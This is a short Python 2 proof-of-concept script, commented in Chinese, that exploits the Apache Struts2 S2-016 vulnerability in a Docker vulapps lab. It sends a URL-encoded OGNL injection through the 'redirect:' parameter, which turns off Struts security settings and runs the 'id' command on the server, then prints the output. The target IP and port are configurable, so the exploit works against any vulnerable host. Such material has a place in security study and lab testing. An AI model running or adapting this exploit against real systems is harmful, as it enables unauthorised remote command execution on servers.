#!/usr/bin/env python
# -*- coding:utf-8 -*-
# python version 2.7.14
#简介：
#脚本适用于docker下的vulapps环境，使用docker run -d -p 8010:8080 medicean/vulapps:s_struts2_s2-016启动环境
#具体信息参见github地址
#https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-016
#此处ip地址为：192.168.109.142

import sys
import requests
import re

argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "用法：python",sys.argv[0],"IP地址 端口号"
    print "例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"
    sys.exit()

ip = "192.168.109.142"
port = "8010"

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]
	

url="http://"+ip+":"+port+"/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D"
res=requests.get(url)
t=res.text
result=re.findall(r"<p>(.*?)</p>",t)
print result


